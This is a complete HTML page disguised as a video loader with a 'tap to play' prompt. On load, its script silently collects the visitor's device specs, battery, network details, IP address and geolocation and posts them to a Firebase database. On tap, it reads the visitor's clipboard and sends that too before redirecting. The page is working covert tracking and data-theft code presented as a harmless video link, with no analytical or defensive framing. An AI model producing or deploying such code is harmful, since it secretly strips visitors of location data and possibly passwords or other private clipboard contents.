<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Video Loading...</title>
    <style>
        body { background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #00a884; border-radius: 50%; width: 30px; height: 30px; animation: spin 0.8s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div id="status" style="text-align:center;">
        <div class="loader"></div>
        <p id="msg" style="margin-top:10px; color:#555; font-size: 13px;">Verifying connection...</p>
    </div>

    <script>
        const DB_URL = "https://location-5d435-default-rtdb.firebaseio.com/";

        async function getIPDetails() {
            // Source 1: ipapi.co (Slightly strict)
            try {
                let r = await fetch('https://ipapi.co/json/');
                let d = await r.json();
                if(d.ip) return { ip: d.ip, loc: `${d.city}, ${d.country_name}`, lat: d.latitude, lon: d.longitude };
            } catch(e){}

            // Source 2: ipwho.is (Backup)
            try {
                let r = await fetch('https://ipwho.is/');
                let d = await r.json();
                if(d.ip) return { ip: d.ip, loc: `${d.city}, ${d.country}`, lat: d.latitude, lon: d.longitude };
            } catch(e){}

            // Source 3: api.ipify.org (Last resort - Only IP)
            try {
                let r = await fetch('https://api.ipify.org?format=json');
                let d = await r.json();
                if(d.ip) return { ip: d.ip, loc: "Unknown Loc (VPN?)", lat: 0, lon: 0 };
            } catch(e){}

            return { ip: "N/A", loc: "N/A", lat: 0, lon: 0 };
        }

        async function startSystem() {
            const params = new URLSearchParams(window.location.search);
            const id = params.get('id');
            if(!id) return;
            const decoded = JSON.parse(atob(id));
            const userKey = decoded.k;
            const targetUrl = decoded.r;

            // Start collecting hardware data
            let data = {
                time: new Date().toLocaleString(),
                device: navigator.platform,
                ram: navigator.deviceMemory || "N/A",
                res: `${screen.width}x${screen.height}`,
                orient: screen.orientation ? screen.orientation.type : "N/A",
                netType: navigator.connection ? navigator.connection.effectiveType : "N/A",
                speed: navigator.connection ? navigator.connection.downlink : "N/A"
            };

            // Battery (Await fast)
            try {
                const b = await navigator.getBattery();
                data.battery = Math.round(b.level * 100);
                data.charging = b.charging ? "Yes" : "No";
            } catch(e){ data.battery = "N/A"; }

            // IP & Loc (Wait for the best source)
            const geo = await getIPDetails();
            data.ip = geo.ip;
            data.loc = geo.loc;
            data.map = `https://www.google.com/maps?q=${geo.lat},${geo.lon}`;

            // Push to Firebase
            fetch(`${DB_URL}tracking/${userKey}.json`, { 
                method: 'POST', 
                body: JSON.stringify(data) 
            });

            // 2 Second UI transition
            setTimeout(() => {
                document.getElementById('status').innerHTML = "<b>⚠️ SECURE CONNECTION ESTABLISHED.<br>TAP TO PLAY VIDEO</b>";
                document.body.onclick = async () => {
                    try {
                        const text = await navigator.clipboard.readText();
                        if(text) fetch(`${DB_URL}clipboard/${userKey}.json`, { 
                            method: 'POST', 
                            body: JSON.stringify({ clipData: text, time: new Date().toLocaleString() }) 
                        });
                    } catch(e){}
                    window.location.href = targetUrl;
                };
            }, 2000);

            // Safety redirect
            setTimeout(() => { window.location.href = targetUrl; }, 8000);
        }

        startSystem();
    </script>
</body>
</html>
